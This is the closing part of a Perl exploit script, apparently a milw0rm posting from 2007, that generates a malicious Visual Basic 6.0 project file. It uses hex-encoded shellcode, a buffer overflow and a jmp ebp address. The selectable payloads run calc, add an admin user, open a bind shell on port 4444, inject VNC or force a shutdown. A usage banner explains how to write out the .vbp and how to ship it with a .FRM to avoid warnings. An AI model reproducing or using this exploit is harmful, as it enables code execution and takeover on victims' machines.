	   "\x42\x50\x42\x30\x42\x50\x4b\x48\x4a\x46\x4e\x43\x4f\x45\x41\x53".
	   "\x48\x4f\x42\x36\x48\x35\x49\x48\x4a\x4f\x43\x58\x42\x4c\x4b\x37".
	   "\x42\x45\x4a\x56\x42\x4f\x4c\x48\x46\x30\x4f\x55\x4a\x56\x4a\x39".
	   "\x50\x4f\x4c\x58\x50\x50\x47\x45\x4f\x4f\x47\x4e\x43\x37\x4a\x56".
           "\x45\x47\x46\x37\x46\x46\x4f\x36\x47\x37\x50\x46\x42\x42\x4d\x42".
	   "\x43\x36\x42\x42\x44\x42\x4a\x34\x41\x54\x49\x34\x42\x42\x48\x35".
	   "\x45\x34\x50\x56\x42\x33\x4d\x56\x42\x52\x42\x57\x47\x57\x50\x56".
	   "\x43\x33\x46\x36\x42\x32\x4c\x46\x42\x33\x42\x33\x44\x37\x42\x32".
	   "\x44\x46\x42\x53\x4a\x57\x42\x33\x44\x47\x42\x52\x47\x47\x49\x56".
	   "\x48\x46\x42\x52\x4b\x56\x42\x33\x43\x57\x4a\x56\x41\x53\x42\x32".
	   "\x45\x37\x42\x32\x44\x56\x41\x43\x46\x37\x43\x46\x4a\x56\x44\x32".
	   "\x42\x30\x5a";

$endQuote = "\x22";

$i = $ARGV[0];


if ($i==1){
print "$begin0$begin1$BuffOf$codeAddr$jmpEbp$fourSkin$begin2$begin3$shellc1$endQuote$koshi";
exit;
}


if ($i==2){
print "$begin0$begin1$BuffOf$codeAddr$jmpEbp$fourSkin$begin2$begin3$shellc2$endQuote$koshi";
exit;
}


if ($i==3){
print "$begin0$begin1$BuffOf$codeAddr$jmpEbp$fourSkin$begin2$begin3$shellc3$endQuote$koshi";
exit;
}


if ($i==4){
print "$begin0$begin1$BuffOf$codeAddr$jmpEbp$fourSkin$begin2$begin3$shellc4$endQuote$koshi";
exit;
}


if ($i==5){
print "$begin0$begin1$BuffOf$codeAddr$jmpEbp$fourSkin$begin2$begin3$shellc5$endQuote$koshi";
exit;
}


print "\n";
print " ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n";
print " +++                                                        +++\n";
print " +++                                                        +++\n";
print " +++ Microsoft Visual Basic 6.0 VBP_Open OLE Local CodeExec +++\n";
print " +++ Written By Koshi                                       +++\n";
print " +++ Greets: Rima my baby! Draven, thanks for helping.      +++\n";
print " +++                                                        +++\n";
print " +++ Usage Ex.: ./vb6.pl 1 >>Project1.vbp                   +++\n";
print " +++                                                        +++\n";
print " +++  Options:                                              +++\n";
print " +++          1 - win32_exec CALC.EXE                       +++\n";
print " +++          2 - win32_adduser Pass=4dmin User=koshi       +++\n";
print " +++          3 - win32_bind Port 4444                      +++\n";
print " +++          4 - win32_bind_vncinject Port 5900            +++\n";
print " +++          5 - win32_exec shutdown -c \x22HAI VEn0m pw..    +++\n";
print " +++                                                        +++\n";
print " +++                                                        +++\n";
print " +++ Notes: Ship final .VBP file with a .FRM file to avoid  +++\n";
print " +++        warnings in Visual Basic 6.0                    +++\n";
print " +++                                                        +++\n";
print " ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n";






exit;


#EOF

# milw0rm.com [2007-09-04]